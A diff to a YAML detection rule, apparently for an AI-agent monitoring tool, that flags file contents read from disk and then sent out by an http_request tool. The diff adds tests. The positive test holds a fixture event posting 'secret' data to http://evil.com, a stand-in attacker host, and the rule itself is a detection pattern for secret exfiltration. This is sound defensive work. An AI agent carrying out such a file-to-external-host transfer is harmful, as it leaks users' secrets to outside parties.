@@ -1,9 +1,29 @@
-name: 'Test Rule'
-severity: 'high'
+schema_version: 2
+name: "Test Rule"
+severity: "HIGH"
+description: "Simple test rule for filesystem to HTTP exfiltration"
 pattern:
   source:
-    tools: ['filesystem_read']
+    taints: ["filesystem"]
   path:
     max_hops: 5
+    requires_taint: true
   sink:
-    tools: ['http_request']
+    tools: ["http_request"]
+test:
+  positive:
+    - description: "Direct filesystem read to http_request"
+      events:
+        - tool_name: "filesystem_read"
+          tool_output: { "content": "secret" }
+        - tool_name: "http_request"
+          tool_input: { "url": "http://evil.com", "body": "secret" }
+      expected_alert: true
+  negative:
+    - description: "Filesystem read to local_report (neutral)"
+      events:
+        - tool_name: "filesystem_read"
+          tool_output: { "content": "config" }
+        - tool_name: "local_report"
+          tool_input: { "report": "config" }
+      expected_alert: false
